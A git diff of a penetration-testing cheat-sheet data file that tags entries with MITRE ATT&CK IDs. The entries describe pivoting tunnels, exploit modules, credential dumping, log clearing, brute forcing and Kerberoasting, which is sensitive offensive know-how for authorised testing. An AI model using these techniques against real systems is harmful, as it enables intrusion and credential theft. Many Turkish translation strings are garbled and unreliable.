             ],
-            "desc_tr": "Run agent on compromised host to connect back"
+            "desc_tr": "Run agent on compromised host to connect back",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Add Route",
@@ -10700,7 +12599,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Add route to access internal network"
+            "desc_tr": "Add route to access internal network",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Start Tunnel",
@@ -10715,7 +12618,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Start the tunnel from ligolo proxy console"
+            "desc_tr": "Start the tunnel from ligolo proxy console",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Add Listener",
@@ -10726,7 +12633,11 @@ module.exports = [
               "tool"
             ],
             "note": "Allows catching reverse shells through the tunnel",
-            "desc_tr": "Add a listener on the agent for reverse connections"
+            "desc_tr": "Add a listener on the agent for reverse connections",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Windows Agent",
@@ -10736,7 +12647,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Run agent on compromised Windows host"
+            "desc_tr": "Run agent on compromised Windows host",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng List Sessions",
@@ -10745,7 +12660,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List active agent sessions in proxy console"
+            "desc_tr": "List active agent sessions in proxy console",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng List Interfaces",
@@ -10754,7 +12673,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Show network interfaces of connected agent"
+            "desc_tr": "Show network interfaces of connected agent",
+            "attack": [
+              "T1016",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Delete Route",
@@ -10763,7 +12687,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Remove route when done with tunnel"
+            "desc_tr": "Remove route when done with tunnel",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Double Pivot Setup",
@@ -10777,7 +12705,12 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Çift pivot için ikinci TUN interface ve route ekle"
+            "desc_tr": "Çift pivot için ikinci TUN interface ve route ekle",
+            "attack": [
+              "T1033",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Stop Tunnel",
@@ -10786,7 +12719,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Aktif tüneli durdur proxy konsolunda"
+            "desc_tr": "Aktif tüneli durdur proxy konsolunda",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Listener List",
@@ -10795,7 +12732,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Agent üzerindeki aktif listener'ları listele"
+            "desc_tr": "Agent üzerindeki aktif listener'ları listele",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Ligolo-ng Transfer File via Listener",
@@ -10809,7 +12750,11 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Listener ile pivot üzerinden dosya transfer et"
+            "desc_tr": "Listener ile pivot üzerinden dosya transfer et",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           }
         ],
         "name_tr": "Ligolo-ng"
@@ -10828,7 +12773,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Configure proxychains for SOCKS proxy"
+            "desc_tr": "Configure proxychains for SOCKS proxy",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains Nmap",
@@ -10838,7 +12787,12 @@ module.exports = [
               "essential"
             ],
             "note": "Only TCP connect scan (-sT) works through proxychains",
-            "desc_tr": "Run nmap through SOCKS proxy"
+            "desc_tr": "Run nmap through SOCKS proxy",
+            "attack": [
+              "T1046",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains Curl",
@@ -10847,7 +12801,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Access web service vekil sunucu (proxy) üzerinden"
+            "desc_tr": "Access web service vekil sunucu (proxy) üzerinden",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains Evil-WinRM",
@@ -10856,7 +12814,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Connect to WinRM through proxy"
+            "desc_tr": "Connect to WinRM through proxy",
+            "attack": [
+              "T1021.006",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains CrackMapExec",
@@ -10865,7 +12828,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Run CrackMapExec through proxy"
+            "desc_tr": "Run CrackMapExec through proxy",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains SMBClient",
@@ -10874,7 +12841,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Connect to SMB share through proxy"
+            "desc_tr": "Connect to SMB share through proxy",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains SSH",
@@ -10883,7 +12854,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SSH SOCKS vekil sunucu (proxy) üzerinden"
+            "desc_tr": "SSH SOCKS vekil sunucu (proxy) üzerinden",
+            "attack": [
+              "T1021.004",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains RDP",
@@ -10892,7 +12868,12 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "RDP SOCKS vekil sunucu (proxy) üzerinden"
+            "desc_tr": "RDP SOCKS vekil sunucu (proxy) üzerinden",
+            "attack": [
+              "T1021.001",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "cURL through SOCKS",
@@ -10910,7 +12891,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Impacket SOCKS üzerinden"
+            "desc_tr": "Impacket SOCKS üzerinden",
+            "attack": [
+              "T1021.002",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Evil-WinRM through Proxy",
@@ -10919,7 +12905,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "WinRM SOCKS üzerinden"
+            "desc_tr": "WinRM SOCKS üzerinden",
+            "attack": [
+              "T1021.006",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "CME through Proxy",
@@ -10928,7 +12919,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "CrackMapExec SOCKS üzerinden"
+            "desc_tr": "CrackMapExec SOCKS üzerinden",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains NetExec MSSQL",
@@ -10937,7 +12932,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "SOCKS proxy ile dahili MSSQL'e NetExec üzerinden eriş"
+            "desc_tr": "SOCKS proxy ile dahili MSSQL'e NetExec üzerinden eriş",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains NetExec MSSQL Command",
@@ -10946,7 +12945,12 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Proxy üzerinden dahili MSSQL'de OS komutu çalıştır"
+            "desc_tr": "Proxy üzerinden dahili MSSQL'de OS komutu çalıştır",
+            "attack": [
+              "T1033",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Proxychains Impacket MSSQL",
@@ -10955,7 +12959,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Proxy üzerinden dahili MSSQL'e impacket ile bağlan"
+            "desc_tr": "Proxy üzerinden dahili MSSQL'e impacket ile bağlan",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           }
         ],
         "name_tr": "SOCKS Proxying"
@@ -11007,7 +13015,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "PuTTY plink for SSH yerel port forward"
+            "desc_tr": "PuTTY plink for SSH yerel port forward",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Plink Remote Forward",
@@ -11017,7 +13029,11 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "PuTTY plink for SSH uzak port forward"
+            "desc_tr": "PuTTY plink for SSH uzak port forward",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Plink Dynamic SOCKS",
@@ -11026,7 +13042,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "PuTTY plink for dynamic SOCKS vekil sunucu (proxy)"
+            "desc_tr": "PuTTY plink for dynamic SOCKS vekil sunucu (proxy)",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           }
         ],
         "name_tr": "Windows Port Forwards"
@@ -11059,7 +13079,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Create netcat relay for port forwarding"
+            "desc_tr": "Create netcat relay for port forwarding",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Rpivot Server (Attacker)",
@@ -11087,7 +13110,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Start DNS tunnel server"
+            "desc_tr": "Start DNS tunnel server",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Dnscat2 Client",
@@ -11097,7 +13123,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Connect via DNS tunnel from target"
+            "desc_tr": "Connect via DNS tunnel from target",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Iodine DNS Tunnel Server",
@@ -11107,7 +13136,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Create IP-over-DNS tunnel server"
+            "desc_tr": "Create IP-over-DNS tunnel server",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "Iodine DNS Tunnel Client",
@@ -11117,7 +13149,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Connect to IP-over-DNS tunnel"
+            "desc_tr": "Connect to IP-over-DNS tunnel",
+            "attack": [
+              "T1048"
+            ]
           },
           {
             "title": "ICMP Shell (icmpsh)",
@@ -11147,7 +13182,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Web-based tunnel uploaded web kabuğu üzerinden"
+            "desc_tr": "Web-based tunnel uploaded web kabuğu üzerinden",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Invoke-SocksProxy (PowerShell)",
@@ -11157,7 +13195,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Create SOCKS proxy on Windows via PowerShell"
+            "desc_tr": "Create SOCKS proxy on Windows via PowerShell",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "FPipe Port Forward (Windows)",
@@ -11185,7 +13226,12 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Chatwo SSH tunnels içinde"
+            "desc_tr": "Chatwo SSH tunnels içinde",
+            "attack": [
+              "T1046",
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Double Pivot Chisel",
@@ -11198,7 +13244,11 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "ChaChisel tunnels içinde"
+            "desc_tr": "ChaChisel tunnels içinde",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           }
         ],
         "name_tr": "Double Pivoting"
@@ -11313,7 +13363,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Select a module to configure and run",
-            "desc_tr": "Select a module configure and run'e"
+            "desc_tr": "Select a module configure and run'e",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "Show Module Info",
@@ -11376,7 +13429,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Run nmap and import results directly into the database",
-            "desc_tr": "Run nmap and import results directly into the database"
+            "desc_tr": "Run nmap and import results directly into the database",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "Import External Scan",
@@ -11385,7 +13441,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Import nmap/Nessus/etc. XML results into the workspace",
-            "desc_tr": "İçe aktar: nmap/Nessus/etc. XML results inthe workspace'e"
+            "desc_tr": "İçe aktar: nmap/Nessus/etc. XML results inthe workspace'e",
+            "attack": [
+              "T1046"
+            ]
           },
           {
             "title": "List Discovered Hosts",
@@ -11442,7 +13501,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Exploit MS17-010 SMB vulnerability for remote code execution",
-            "desc_tr": "İstismar et: r MS17-010 SMB zafiyet(ler) for uzak kod çalıştırma"
+            "desc_tr": "İstismar et: r MS17-010 SMB zafiyet(ler) for uzak kod çalıştırma",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "PsExec Module",
@@ -11459,7 +13521,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Authenticate and execute payload via SMB PsExec",
-            "desc_tr": "kimlik doğrulama and execute payload SMB PsExec üzerinden"
+            "desc_tr": "kimlik doğrulama and execute payload SMB PsExec üzerinden",
+            "attack": [
+              "T1021.002"
+            ]
           },
           {
             "title": "Web Delivery (PowerShell)",
@@ -11475,7 +13540,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Host a payload for download and execution via PowerShell one-liner",
-            "desc_tr": "Host a payload for download and executiPowerShell one-liner üzerinden üzerinde"
+            "desc_tr": "Host a payload for download and executiPowerShell one-liner üzerinden üzerinde",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Web Delivery (Python)",
@@ -11679,7 +13747,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "yerel UAC bypass"
+            "desc_tr": "yerel UAC bypass",
+            "attack": [
+              "T1548.002"
+            ]
           },
           {
             "title": "PwnKit",
@@ -11692,7 +13763,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Linux pkexec yetki yükseltme (PwnKit)"
+            "desc_tr": "Linux pkexec yetki yükseltme (PwnKit)",
+            "attack": [
+              "T1068"
+            ]
           }
         ],
         "name_tr": "Exploitation Modules"
@@ -11725,7 +13799,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Attempt to escalate privileges to NT AUTHORITY\\SYSTEM",
-            "desc_tr": "Attempt to escalate privileges to NT AUTHORITY\\SYSTEM"
+            "desc_tr": "Attempt to escalate privileges to NT AUTHORITY\\SYSTEM",
+            "attack": [
+              "T1134.001"
+            ]
           },
           {
             "title": "Dump Password Hashes",
@@ -11734,7 +13811,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Dump SAM database password hashes (requires SYSTEM)",
-            "desc_tr": "Dump SAM database password hashes (requires SYSTEM)"
+            "desc_tr": "Dump SAM database password hashes (requires SYSTEM)",
+            "attack": [
+              "T1003.002"
+            ]
           },
           {
             "title": "Load Kiwi (Mimikatz)",
@@ -11743,7 +13823,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Load the Kiwi extension for credential extraction",
-            "desc_tr": "Load the Kiwi extension for credential extraction"
+            "desc_tr": "Load the Kiwi extension for credential extraction",
+            "attack": [
+              "T1003.001"
+            ]
           },
           {
             "title": "Dump All Credentials",
@@ -11932,7 +14015,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "İzleri temizle"
+            "desc_tr": "İzleri temizle",
+            "attack": [
+              "T1070.001"
+            ]
           },
           {
             "title": "Keylogger",
@@ -12048,7 +14134,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Forward a local port to a remote service through meterpreter",
-            "desc_tr": "Forward a local port to a remote service through meterpreter"
+            "desc_tr": "Forward a local port to a remote service through meterpreter",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Port Forward (List)",
@@ -12057,7 +14147,11 @@ module.exports = [
               "tool"
             ],
             "desc": "List all active port forwards",
-            "desc_tr": "Aktif port yönlendirmelerini listele"
+            "desc_tr": "Aktif port yönlendirmelerini listele",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Port Forward (Flush)",
@@ -12066,7 +14160,11 @@ module.exports = [
               "tool"
             ],
             "desc": "Remove all active port forwards",
-            "desc_tr": "Remove all active port forwards"
+            "desc_tr": "Remove all active port forwards",
+            "attack": [
+              "T1090",
+              "T1572"
+            ]
           },
           {
             "title": "Upgrade Shell to Meterpreter",
@@ -12130,7 +14228,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Brute force SMB authentication credentials",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMB kimlik doğrulama kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMB kimlik doğrulama kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "SSH Login Brute Force",
@@ -12146,7 +14247,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Brute force SSH credentials",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "FTP Anonymous Check",
@@ -12214,7 +14318,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Brute force Microsoft SQL Server credentials",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı Microsoft SQL Server kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı Microsoft SQL Server kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "HTTP Login Brute Force",
@@ -12230,7 +14337,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Brute force HTTP Basic/Digest authentication",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HTTP Basic/Digest kimlik doğrulama"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HTTP Basic/Digest kimlik doğrulama",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "MySQL Login Scanner",
@@ -12245,7 +14355,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Brute force MySQL credentials",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL kimlik bilgileri"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL kimlik bilgileri",
+            "attack": [
+              "T1110.001"
+            ]
           },
           {
             "title": "NFS Share Scanner",
@@ -12285,7 +14398,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Scan for CVE-2019-0708 BlueKeep vulnerability",
-            "desc_tr": "Scan for CVE-2019-0708 BlueKeep vulnerability"
+            "desc_tr": "Scan for CVE-2019-0708 BlueKeep vulnerability",
+            "attack": [
+              "T1210"
+            ]
           },
           {
             "title": "HTTP WordPress Scanner",
@@ -12417,7 +14533,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Dump password hashes from /etc/shadow",
-            "desc_tr": "Dump password hashes from /etc/shadow"
+            "desc_tr": "Dump password hashes from /etc/shadow",
+            "attack": [
+              "T1003.002",
+              "T1003.008"
+            ]
           },
           {
             "title": "Multi Gather SSH Creds",
@@ -12435,7 +14555,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Extract saved passwords from Firefox profiles",
-            "desc_tr": "Extract saved passwords from Firefox profiles"
+            "desc_tr": "Extract saved passwords from Firefox profiles",
+            "attack": [
+              "T1555.003"
+            ]
           },
           {
             "title": "Multi Manage Autoroute",
@@ -12469,7 +14592,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Collect all BloodHound data from the domain",
-            "desc_tr": "Collect all BloodHound data from the domain"
+            "desc_tr": "Collect all BloodHound data from the domain",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "SharpHound (Stealth)",
@@ -12478,7 +14605,11 @@ module.exports = [
               "advanced"
             ],
             "desc": "Collect BloodHound data using only DC queries for stealth",
-            "desc_tr": "Collect BloodHound data using only DC queries for stealth"
+            "desc_tr": "Collect BloodHound data using only DC queries for stealth",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "BloodHound-Python (Remote)",
@@ -12487,7 +14618,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Collect BloodHound data remotely from Linux",
-            "desc_tr": "Collect BloodHound data remotely from Linux"
+            "desc_tr": "Collect BloodHound data remotely from Linux",
+            "attack": [
+              "T1087.002",
+              "T1482"
+            ]
           },
           {
             "title": "Start Neo4j for BloodHound",
@@ -12523,7 +14658,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Get detailed domain information via AD PowerShell module",
-            "desc_tr": "Get detailed domain information via AD PowerShell module"
+            "desc_tr": "Get detailed domain information via AD PowerShell module",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Enum4linux-ng Full Scan",
@@ -12532,7 +14670,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Comprehensive SMB/LDAP/RPC enumeration",
-            "desc_tr": "Kapsamlı SMB/LDAP/RPC listeleme"
+            "desc_tr": "Kapsamlı SMB/LDAP/RPC listeleme",
+            "attack": [
+              "T1135"
+            ]
           },
           {
             "title": "LDAP Domain Dump",
@@ -12568,7 +14709,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate valid domain usernames via Kerberos without authentication",
-            "desc_tr": "Enumerate valid domain usernames via Kerberos without authentication"
+            "desc_tr": "Enumerate valid domain usernames via Kerberos without authentication",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Impacket GetADUsers",
@@ -12595,7 +14739,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Attempt a DNS zone transfer from a domain controller",
-            "desc_tr": "Attempt a DNS zone transfer from a domain controller"
+            "desc_tr": "Attempt a DNS zone transfer from a domain controller",
+            "attack": [
+              "T1590.002"
+            ]
           },
           {
             "title": "PingCastle",
@@ -12628,7 +14775,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate all domain users with key attributes",
-            "desc_tr": "Enumerate all domain users with key attributes"
+            "desc_tr": "Enumerate all domain users with key attributes",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "PowerView Get Specific User",
@@ -12637,7 +14787,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Get all properties for a specific domain user",
-            "desc_tr": "Get all properties for a specific domain user"
+            "desc_tr": "Get all properties for a specific domain user",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "PowerView Get Domain Groups",
@@ -12646,7 +14799,10 @@ module.exports = [
               "essential"
             ],
             "desc": "List all domain groups",
-            "desc_tr": "Tüm domain gruplarını listele"
+            "desc_tr": "Tüm domain gruplarını listele",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "PowerView Get Group Members",
@@ -12655,7 +14811,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Recursively enumerate members of Domain Admins",
-            "desc_tr": "Recursively enumerate members of DomaAdmin içinde"
+            "desc_tr": "Recursively enumerate members of DomaAdmin içinde",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "PowerView Get Domain Computers",
@@ -12691,7 +14850,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate all AD users with properties",
-            "desc_tr": "Enumerate all AD users with properties"
+            "desc_tr": "Enumerate all AD users with properties",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "AD Module Get-ADGroup",
@@ -12700,7 +14862,10 @@ module.exports = [
               "tool"
             ],
             "desc": "List all AD groups with their scope",
-            "desc_tr": "List all AD groups with their scope"
+            "desc_tr": "List all AD groups with their scope",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "AD Module Get-ADComputer",
@@ -12718,7 +14883,10 @@ module.exports = [
               "essential"
             ],
             "desc": "List all domain users via built-in Windows command",
-            "desc_tr": "List all domain users via built-in Windows command"
+            "desc_tr": "List all domain users via built-in Windows command",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Net Group Domain Admins",
@@ -12727,7 +14895,10 @@ module.exports = [
               "essential"
             ],
             "desc": "List members of Domain Admins via built-in command",
-            "desc_tr": "List members of Domain Admins via built-in command"
+            "desc_tr": "List members of Domain Admins via built-in command",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Find Users with Descriptions",
@@ -12737,7 +14908,10 @@ module.exports = [
             ],
             "desc": "Find users with descriptions that may contain passwords",
             "note": "Descriptions often contain password hints or temporary passwords",
-            "desc_tr": "Find users with descriptions that may contain passwords"
+            "desc_tr": "Find users with descriptions that may contain passwords",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "PowerView Find Local Admin Access",
@@ -12809,7 +14983,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Enumerate domain admins via LDAP",
-            "desc_tr": "Enumerate domain admins via LDAP"
+            "desc_tr": "Enumerate domain admins via LDAP",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Windapsearch Unconstrained Delegation",
@@ -12836,7 +15013,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Brute force a single user password via Kerberos",
-            "desc_tr": "Kaba kuvvet: kuvvet saldırısı a single user password Kerberos üzerinden"
+            "desc_tr": "Kaba kuvvet: kuvvet saldırısı a single user password Kerberos üzerinden",
+            "attack": [
+              "T1110.003"
+            ]
           },
           {
             "title": "Enum GPO Permissions",
@@ -12872,7 +15052,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Generate comprehensive AD reconnaissance report",
-            "desc_tr": "Generate comprehensive AD reconnaissance report"
+            "desc_tr": "Generate comprehensive AD reconnaissance report",
+            "attack": [
+              "T1059.001"
+            ]
           }
         ],
         "name_tr": "User & Group Enumeration"
@@ -12923,7 +15106,10 @@ module.exports = [
               "advanced"
             ],
             "desc": "Check who has WriteDACL permission on Domain Admins",
-            "desc_tr": "Kontrol et: who has WriteDACL permission DomaAdmin üzerinde içinde"
+            "desc_tr": "Kontrol et: who has WriteDACL permission DomaAdmin üzerinde içinde",
+            "attack": [
+              "T1069.002"
+            ]
           },
           {
             "title": "Enumerate GPO Permissions",
@@ -12947,7 +15133,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate all domain trust relationships",
-            "desc_tr": "Enumerate all domain trust relationships"
+            "desc_tr": "Enumerate all domain trust relationships",
+            "attack": [
+              "T1482"
+            ]
           },
           {
             "title": "PowerView Get Forest Trusts",
@@ -12956,7 +15145,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Enumerate forest-level trust relationships",
-            "desc_tr": "Enumerate forest-level trust relationships"
+            "desc_tr": "Enumerate forest-level trust relationships",
+            "attack": [
+              "T1482"
+            ]
           },
           {
             "title": "AD Module Get-ADTrust",
@@ -12974,7 +15166,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Map trust direction and type for all trusts",
-            "desc_tr": "Map trust directiand type for tüm trusts üzerinde"
+            "desc_tr": "Map trust directiand type for tüm trusts üzerinde",
+            "attack": [
+              "T1482"
+            ]
           },
           {
             "title": "Enumerate Foreign Group Members",
@@ -13016,7 +15211,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Find users with SPNs set (Kerberoastable)",
-            "desc_tr": "Find users with SPNs set (Kerberoastable)"
+            "desc_tr": "Find users with SPNs set (Kerberoastable)",
+            "attack": [
+              "T1558.003",
+              "T1087"
+            ]
           },
           {
             "title": "Find AS-REP Roastable Users",
@@ -13025,7 +15224,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Find users with Kerberos pre-auth disabled",
-            "desc_tr": "Find users with Kerberos pre-auth disabled"
+            "desc_tr": "Find users with Kerberos pre-auth disabled",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Setspn Query All SPNs",
@@ -13061,7 +15263,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Find users with constrained delegation configured",
-            "desc_tr": "Find users with constrained delegation configured"
+            "desc_tr": "Find users with constrained delegation configured",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Find RBCD Targets",
@@ -13157,7 +15362,9 @@ module.exports = [
             ],
             "desc": "Request TGS tickets for all SPNs and save hashes for cracking",
             "desc_tr": "Request TGS tickets for all SPNs and save hashes for cracking",
-            "attack": "T1558.003",
+            "attack": [
+              "T1558.003"
+            ],
             "ref": "https://attack.mitre.org/techniques/T1558/003/"
           },
           {
@@ -13167,7 +15374,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Request and dump TGS tickets for all Kerberoastable users",
-            "desc_tr": "Request and dump TGS tickets for all Kerberoastable users"
+            "desc_tr": "Request and dump TGS tickets for all Kerberoastable users",
+            "attack": [
+              "T1558.003"
+            ]
           },
           {
             "title": "Kerberoast Specific User",
@@ -13176,7 +15386,10 @@ module.exports = [
               "tool"
             ],
             "desc": "Target a specific user for Kerberoasting",
-            "desc_tr": "Target a belirli user for Kerberoasting"
+            "desc_tr": "Target a belirli user for Kerberoasting",
+            "attack": [
+              "T1558.003"
+            ]
           },
           {
             "title": "Crack Kerberoast Hashes",
@@ -13185,7 +15398,11 @@ module.exports = [
               "essential"
             ],
             "desc": "Crack TGS-REP hashes (Kerberoast) with hashcat",
-            "desc_tr": "Crack TGS-REP hashes (Kerberoast) with hashcat"
+            "desc_tr": "Crack TGS-REP hashes (Kerberoast) with hashcat",
+            "attack": [
+              "T1558.003",
+              "T1110.002"
+            ]
           },
           {
             "title": "AS-REP Roasting (Impacket)",
@@ -13194,7 +15411,10 @@ module.exports = [
               "essential"
             ],
             "desc": "Extract AS-REP hashes for users without pre-auth",
